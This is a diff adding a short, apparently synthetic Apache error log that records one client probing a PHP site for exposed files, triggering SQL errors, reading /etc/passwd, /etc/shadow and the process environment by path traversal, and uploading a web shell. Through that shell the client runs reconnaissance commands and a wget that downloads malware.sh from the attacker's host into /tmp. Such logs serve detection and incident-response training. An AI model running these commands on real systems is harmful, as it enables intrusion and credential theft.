@@ -1,0 +1,22 @@
+[Wed Mar 31 22:00:01.000000 2026] [mpm_prefork:notice] [pid 1010] AH00163: Apache/2.4.54 (Ubuntu) PHP/8.1.2 configured
+[Wed Mar 31 22:00:01.000001 2026] [core:notice] [pid 1010] AH00094: Command line: '/usr/sbin/apache2'
+[Wed Mar 31 22:10:00.123456 2026] [php:notice] [pid 1011] [client 192.168.1.10:54321] PHP Notice: Undefined variable in /var/www/html/login.php on line 42
+[Wed Mar 31 22:30:10.234567 2026] [php:notice] [pid 1012] [client 192.168.1.10:54400] PHP Notice: file uploaded successfully: profile_pic.jpg
+[Thu Apr 01 02:00:26.000000 2026] [php:error] [pid 1020] [client 185.220.101.5:44100] PHP Warning: file_get_contents(/.git/config): Possible sensitive file exposure in /var/www/html/download.php on line 18
+[Thu Apr 01 02:00:30.000001 2026] [php:error] [pid 1021] [client 185.220.101.5:44101] PHP Warning: file_get_contents(/config.php.bak): Sensitive backup file exposed in /var/www/html/download.php on line 18
+[Thu Apr 01 02:10:05.345678 2026] [php:error] [pid 1022] [client 185.220.101.5:55100] PHP Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax check near ''' at line 1 in /var/www/html/login.php:55
+[Thu Apr 01 02:10:10.456789 2026] [php:error] [pid 1023] [client 185.220.101.5:55101] PHP Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result in /var/www/html/login.php on line 60
+[Thu Apr 01 02:10:50.567890 2026] [php:error] [pid 1024] [client 185.220.101.5:55102] PHP Warning: mysqli_num_rows(): Couldn't fetch mysqli_result in /var/www/html/login.php on line 61
+[Thu Apr 01 02:20:15.678901 2026] [php:error] [pid 1025] [client 185.220.101.5:55200] PHP Warning: file_get_contents(../../etc/passwd): Path traversal detected — reading /etc/passwd in /var/www/html/download.php on line 18
+[Thu Apr 01 02:20:20.789012 2026] [php:error] [pid 1026] [client 185.220.101.5:55201] PHP Warning: file_get_contents(../../etc/shadow): failed to open stream: Permission denied in /var/www/html/download.php on line 18
+[Thu Apr 01 02:20:25.890123 2026] [php:error] [pid 1027] [client 185.220.101.5:55202] PHP Warning: file_get_contents(../../proc/self/environ): Path traversal — reading process environment in /var/www/html/download.php on line 18
+[Thu Apr 01 02:30:10.901234 2026] [php:notice] [pid 1028] [client 185.220.101.5:55300] PHP Notice: File uploaded — Name: shell.php, Size: 128 bytes, Type: application/x-php in /var/www/html/upload.php on line 34
+[Thu Apr 01 02:30:10.901235 2026] [php:error] [pid 1028] [client 185.220.101.5:55300] PHP Warning: SECURITY — PHP file upload detected: shell.php — file type restrictions bypassed in /var/www/html/upload.php on line 38
+[Thu Apr 01 02:30:35.012345 2026] [php:error] [pid 1029] [client 185.220.101.5:55301] PHP Fatal error: Call to undefined function in /var/www/html/uploads/shell.php on line 1
+[Thu Apr 01 02:30:40.123456 2026] [php:notice] [pid 1030] [client 185.220.101.5:55302] PHP Notice: shell.php executed system command: id in /var/www/html/uploads/shell.php on line 3
+[Thu Apr 01 02:30:45.234567 2026] [php:notice] [pid 1031] [client 185.220.101.5:55303] PHP Notice: shell.php executed system command: whoami in /var/www/html/uploads/shell.php on line 3
+[Thu Apr 01 02:30:55.345678 2026] [php:notice] [pid 1032] [client 185.220.101.5:55304] PHP Notice: shell.php executed system command: cat /etc/passwd in /var/www/html/uploads/shell.php on line 3
+[Thu Apr 01 02:31:00.456789 2026] [php:notice] [pid 1033] [client 185.220.101.5:55305] PHP Notice: shell.php executed system command: cat /etc/shadow in /var/www/html/uploads/shell.php on line 3
+[Thu Apr 01 02:31:20.567890 2026] [php:notice] [pid 1034] [client 185.220.101.5:55306] PHP Notice: shell.php executed system command: wget http://185.220.101.5/malware.sh -O /tmp/.update.sh in /var/www/html/uploads/shell.php on line 3
+[Thu Apr 01 02:10:06.123456 2026] [mpm_prefork:error] [pid 1010] AH00161: server reached MaxRequestWorkers setting, consider raising the MaxRequestWorkers setting
+[Thu Apr 01 08:00:05.000000 2026] [php:notice] [pid 2010] [client 192.168.1.10:52001] PHP Notice: Normal user access to index.php
